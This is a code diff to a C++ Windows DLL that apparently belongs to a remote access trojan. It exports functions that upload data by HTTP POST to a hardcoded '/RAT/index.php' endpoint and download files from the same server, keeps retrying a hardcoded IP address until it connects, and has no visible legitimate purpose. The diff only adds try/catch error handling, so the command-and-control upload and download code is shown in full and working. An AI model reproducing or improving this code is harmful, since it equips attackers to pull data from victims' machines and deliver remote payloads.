@@ -60,236 +60,261 @@ __declspec(dllexport) int send_data(const std::string& filename, const std::stri
 {
     std::lock_guard<std::mutex> lock(socketMutex);
 
-    std::string requestString = "POST /RAT/index.php HTTP/1.1\r\n"
-                                "Host: arth.imbeddex.com\r\n"
-                                "Content-Length: " + std::to_string(filename.length() + data.length()) + "\r\n"
-                                "Content-Type: application/octet-stream\r\n"
-                                "Connection: keep-alive\r\n\r\n" +
-                                filename + data;
-    int bytesSent = send(clientSocket, requestString.c_str(), requestString.length(), 0);
-    if (bytesSent == SOCKET_ERROR)
-    {
-        int error = WSAGetLastError();
-        std::cerr << "Send failed with error: " << error << std::endl;
-        return 1;
-    }
-
-    char buffer[4096];
-    int bytesReceived;
-    std::string response;
-
-    do {
-        bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
-        if (bytesReceived > 0)
-        {
-            buffer[bytesReceived] = '\0';
-            response += buffer;
-        }
-        else if (bytesReceived == 0)
-        {
-            //std::cout << "Connection closed by server." << std::endl;
-            break;
-        }
-        else
+    try {
+        std::string requestString = "POST /RAT/index.php HTTP/1.1\r\n"
+                                    "Host: arth.imbeddex.com\r\n"
+                                    "Content-Length: " + std::to_string(filename.length() + data.length()) + "\r\n"
+                                    "Content-Type: application/octet-stream\r\n"
+                                    "Connection: keep-alive\r\n\r\n" +
+                                    filename + data;
+        int bytesSent = send(clientSocket, requestString.c_str(), requestString.length(), 0);
+        if (bytesSent == SOCKET_ERROR)
         {
             int error = WSAGetLastError();
-            std::cerr << "Receive failed with error: " << error << std::endl;
-            break;
+            std::cerr << "Send failed with error: " << error << std::endl;
+            throw std::runtime_error("Send failed");
         }
-    } while (bytesReceived == sizeof(buffer) - 1);
-    
-    return 0;
+
+        char buffer[4096];
+        int bytesReceived;
+        std::string response;
+
+        do {
+            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
+            if (bytesReceived > 0)
+            {
+                buffer[bytesReceived] = '\0';
+                response += buffer;
+            }
+            else if (bytesReceived == 0)
+            {
+                //std::cout << "Connection closed by server." << std::endl;
+                break;
+            }
+            else
+            {
+                int error = WSAGetLastError();
+                std::cerr << "Receive failed with error: " << error << std::endl;
+                throw std::runtime_error("Receive failed");
+            }
+        } while (bytesReceived == sizeof(buffer) - 1);
+        
+        return 0;
+    }
+    catch (const std::exception& e)
+    {
+        std::cerr << "Exception in send_data: " << e.what() << std::endl;
+        return 1;
+    }
 }
 
 __declspec(dllexport) std::string receive_data(const std::string& filename)
 {
     std::lock_guard<std::mutex> lock(socketMutex);
 
-    std::string requestString = "GET /RAT/" + filename + " HTTP/1.1\r\n"
-                                "Host: arth.imbeddex.com\r\n"
-                                "Connection: keep-alive\r\n\r\n";
-    int bytesSent = send(clientSocket, requestString.c_str(), requestString.length(), 0);
-    if (bytesSent == SOCKET_ERROR)
+    try
     {
-        int error = WSAGetLastError();
-        std::cerr << "Send failed with error: " << error << std::endl;
-        return "";
-    }
-
-    char buffer[4096];
-    std::string receivedData;
-    int bytesReceived;
-
-    do {
-        bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
-        if (bytesReceived > 0)
-        {
-            buffer[bytesReceived] = '\0';
-            receivedData += buffer;
-        }
-        else if (bytesReceived == 0)
-        {
-            //std::cerr << "Connection closed by server." << std::endl;
-            break;
-        }
-        else
+        std::string requestString = "GET /RAT/" + filename + " HTTP/1.1\r\n"
+                                    "Host: arth.imbeddex.com\r\n"
+                                    "Connection: keep-alive\r\n\r\n";
+        int bytesSent = send(clientSocket, requestString.c_str(), requestString.length(), 0);
+        if (bytesSent == SOCKET_ERROR)
         {
             int error = WSAGetLastError();
-            if (error != WSAECONNRESET)
-                std::cerr << "Receive failed with error: " << error << std::endl;
-            break;
+            std::cerr << "Send failed with error: " << error << std::endl;
+            throw std::runtime_error("Send failed");
         }
-    } while (bytesReceived == sizeof(buffer) - 1);
 
-    size_t headerEnd = receivedData.find("\r\n\r\n");
-    if (headerEnd == std::string::npos)
-    {
-        std::cerr << "Invalid HTTP response: No header/body separator found." << std::endl;
-        return "";
-    }
+        char buffer[4096];
+        std::string receivedData;
+        int bytesReceived;
 
-    std::string body = receivedData.substr(headerEnd + 4);
-
-    size_t transferEncodingPos = receivedData.find("Transfer-Encoding: chunked");
-    if (transferEncodingPos != std::string::npos)
-    {
-        std::string unchunkedBody;
-        const char* ptr = body.c_str();
-        const char* end = ptr + body.length();
-
-        while (ptr < end)
-        {
-            while (ptr < end && (*ptr == ' ' || *ptr == '\r' || *ptr == '\n'))
-                ptr++;
-
-            if (ptr >= end) break;
-
-            size_t chunkSize = 0;
-            while (ptr < end && isxdigit(*ptr))
+        do {
+            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
+            if (bytesReceived > 0)
             {
-                chunkSize *= 16;
-                chunkSize += isdigit(*ptr) ? *ptr - '0' : (tolower(*ptr) - 'a' + 10);
-                ptr++;
+                buffer[bytesReceived] = '\0';
+                receivedData += buffer;
             }
+            else if (bytesReceived == 0)
+            {
+                std::cerr << "Connection closed by server." << std::endl;
+                throw std::runtime_error("Connection closed by server");
+            }
+            else
+            {
+                int error = WSAGetLastError();
+                if (error != WSAECONNRESET)
+                {
+                    std::cerr << "Receive failed with error: " << error << std::endl;
+                    throw std::runtime_error("Receive failed.");
+                }
+            }
+        } while (bytesReceived == sizeof(buffer) - 1);
 
-            while (ptr < end && (*ptr == '\r' || *ptr == '\n')) ptr++;
-
-            if (chunkSize == 0) break;
-            if (ptr + chunkSize > end) break;
-
-            unchunkedBody.append(ptr, chunkSize);
-            ptr += chunkSize;
+        size_t headerEnd = receivedData.find("\r\n\r\n");
+        if (headerEnd == std::string::npos)
+        {
+            std::cerr << "Invalid HTTP response: No header/body separator found." << std::endl;
+            throw std::runtime_error("Invalid HTTP response: No header/body separator found.");
         }
-        body = unchunkedBody;
-    }
 
-    return body;
+        std::string body = receivedData.substr(headerEnd + 4);
+
+        size_t transferEncodingPos = receivedData.find("Transfer-Encoding: chunked");
+        if (transferEncodingPos != std::string::npos)
+        {
+            std::string unchunkedBody;
+            const char* ptr = body.c_str();
+            const char* end = ptr + body.length();
+
+            while (ptr < end)
+            {
+                while (ptr < end && (*ptr == ' ' || *ptr == '\r' || *ptr == '\n')) ++ptr;
+
+                if (ptr >= end) break;
+
+                size_t chunkSize = 0;
+                while (ptr < end && isxdigit(*ptr))
+                {
+                    chunkSize *= 16;
+                    chunkSize += isdigit(*ptr) ? *ptr - '0' : (tolower(*ptr) - 'a' + 10);
+                    ++ptr;
+                }
+
+                while (ptr < end && (*ptr == '\r' || *ptr == '\n')) ++ptr;
+
+                if (chunkSize == 0) break;
+                if (ptr + chunkSize > end) break;
+
+                unchunkedBody.append(ptr, chunkSize);
+                ptr += chunkSize;
+            }
+            body = unchunkedBody;
+        }
+        return body;
+    }
+    catch (const std::exception& e)
+    {
+        std::cerr << "Exception in receive_data: " << e.what() << std::endl;
+    }
+    return "";
 }
 
 __declspec(dllexport) std::vector<unsigned char> receive_data_raw(const std::string &filename)
 {
     std::lock_guard<std::mutex> lock1(socketMutex);
 
-    //////////////////////////////////////////////////////////////////////////////////////////////////
     SOCKET TempSocket = INVALID_SOCKET;
-    TempSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (TempSocket == INVALID_SOCKET)
+    try
     {
-        std::cerr << "Socket creation failed.\n";
-        WSACleanup();
-    }
-
-    sockaddr_in serverAddr;
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(80);
-    serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");
-
-    while (connect(TempSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
-    {
-        int error = WSAGetLastError();
-        if (error != WSAECONNREFUSED)
-            std::cerr << "Connection failed with error: " << error << ". Retrying in 2 seconds...\n";
-        else
-            std::cerr << "Connection refused. Retrying in 2 seconds...\n";
-        Sleep(2000);
-    }
-
-    ///////////////////////////////////////////////////////////////////////////////////////////////////
-
-    // Send HTTP GET request
-    std::string httpRequest = "GET /RAT/" + filename + " HTTP/1.1\r\n";
-    httpRequest += "Host: arth.imbeddex.com\r\n";
-    httpRequest += "Connection: close\r\n\r\n";
-
-    int bytesSent = send(TempSocket, httpRequest.c_str(), httpRequest.length(), 0);
-    if (bytesSent == SOCKET_ERROR)
-    {
-        int error = WSAGetLastError();
-        std::cerr << "Send failed with error: " << error << std::endl;
-        throw std::runtime_error("Send failed");
-    }
-
-    // Receive data in chunks
-    char buffer[8192]; // Increased buffer size
-    std::vector<unsigned char> receivedData;
-    int bytesReceived;
-
-    do {
-        bytesReceived = recv(TempSocket, buffer, sizeof(buffer), 0);
-        if (bytesReceived > 0) receivedData.insert(receivedData.end(), buffer, buffer + bytesReceived);
-        else if (bytesReceived == 0)
+        TempSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (TempSocket == INVALID_SOCKET)
         {
-            //std::cerr << "Connection closed by server." << std::endl; // Server closed connection, which is expected with "Connection: close"
-            break;
+            std::cerr << "Socket creation failed.\n";
+            WSACleanup();
+            throw std::runtime_error("Socket creation failed");
         }
-        else
+
+        sockaddr_in serverAddr;
+        serverAddr.sin_family = AF_INET;
+        serverAddr.sin_port = htons(80);
+        serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");
+
+        while (connect(TempSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
         {
             int error = WSAGetLastError();
-            std::cerr << "Receive failed with error: " << error << std::endl;
-            break;
+            if (error != WSAECONNREFUSED) std::cerr << "Connection failed with error: " << error << ". Retrying in 2 seconds...\n";
+            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
+            Sleep(2000);
         }
-    } while (bytesReceived > 0);
 
-    // Ensure header separator is found
-    size_t headerEnd = 0;
-    const unsigned char CRLF[] = {0x0D, 0x0A, 0x0D, 0x0A};
+        // Send HTTP GET request
+        std::string httpRequest = "GET /RAT/" + filename + " HTTP/1.1\r\n";
+        httpRequest += "Host: arth.imbeddex.com\r\n";
+        httpRequest += "Connection: close\r\n\r\n";
 
-    // Search for header separator (CRLF + CRLF)
-    for (size_t i = 0; i < receivedData.size() - 3; ++i)
-    {
-        if (receivedData[i] == CRLF[0] && receivedData[i + 1] == CRLF[1] && receivedData[i + 2] == CRLF[2] && receivedData[i + 3] == CRLF[3])
+        int bytesSent = send(TempSocket, httpRequest.c_str(), httpRequest.length(), 0);
+        if (bytesSent == SOCKET_ERROR)
         {
-            headerEnd = i + 4; // Found header, skip the separator
-            break;
+            int error = WSAGetLastError();
+            std::cerr << "Send failed with error: " << error << std::endl;
+            throw std::runtime_error("Send failed");
         }
-    }
 
-    if (headerEnd == 0)
-    {
-        std::cerr << "Header separator not found." << std::endl;
-        throw std::runtime_error("Header separator not found");
-    }
+        // Receive data in chunks
+        char buffer[8192];
+        std::vector<unsigned char> receivedData;
+        int bytesReceived;
 
-    // Make sure headerEnd is within the bounds of the receivedData
-    if (headerEnd < receivedData.size())
-    {
-        // Extract body after header (start from headerEnd)
-        std::vector<unsigned char> body(receivedData.begin() + headerEnd, receivedData.end());
+        do
+        {
+            bytesReceived = recv(TempSocket, buffer, sizeof(buffer), 0);
+            if (bytesReceived > 0) receivedData.insert(receivedData.end(), buffer, buffer + bytesReceived);
+            else if (bytesReceived == 0)
+            {
+                //std::cerr << "Connection closed by server." << std::endl; // Server closed connection, which is expected with "Connection: close"
+                break;
+            }
+            else
+            {
+                int error = WSAGetLastError();
+                std::cerr << "Receive failed with error: " << error << std::endl;
+                break;
+            }
+        } while (bytesReceived > 0);
+
+        try
+        {
+            // Ensure header separator is found
+            size_t headerEnd = 0;
+            const unsigned char CRLF[] = {0x0D, 0x0A, 0x0D, 0x0A};
+
+            // Search for header separator (CRLF + CRLF)
+            for (size_t i = 0; i < receivedData.size() - 3; ++i)
+            {
+                if (receivedData[i] == CRLF[0] && receivedData[i + 1] == CRLF[1] && receivedData[i + 2] == CRLF[2] && receivedData[i + 3] == CRLF[3])
+                {
+                    headerEnd = i + 4; // Found header, skip the separator
+                    break;
+                }
+            }
+
+            if (headerEnd == 0)
+            {
+                std::cerr << "Header separator not found." << std::endl;
+                throw std::runtime_error("Header separator not found");
+            }
+
+            if (headerEnd < receivedData.size())
+            {
+                std::vector<unsigned char> body(receivedData.begin() + headerEnd, receivedData.end());      
+                return body;
+            }
+            else
+            {
+                std::cerr << "Body extraction failed: headerEnd exceeds receivedData size." << std::endl;
+                throw std::runtime_error("Body extraction failed");
+            }
+        }
+        catch (...)
+        {
+            if (TempSocket != INVALID_SOCKET)
+            {
+                shutdown(TempSocket, SD_BOTH);
+                closesocket(TempSocket);
+                TempSocket = INVALID_SOCKET;
+            }
+            throw;
+        }
         
-        return body; // Return the extracted body
     }
-    else
+    catch (const std::exception& e)
     {
-        std::cerr << "Body extraction failed: headerEnd exceeds receivedData size." << std::endl;
-        throw std::runtime_error("Body extraction failed");
+        std::cerr << "Exception in receive_data_raw: " << e.what() << std::endl;
     }
 
-    if (TempSocket != INVALID_SOCKET)
-    {
-        shutdown(TempSocket, SD_BOTH);
-        closesocket(TempSocket);
-        TempSocket = INVALID_SOCKET;
-    }
+    return std::vector<unsigned char>();
 }
 
 BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
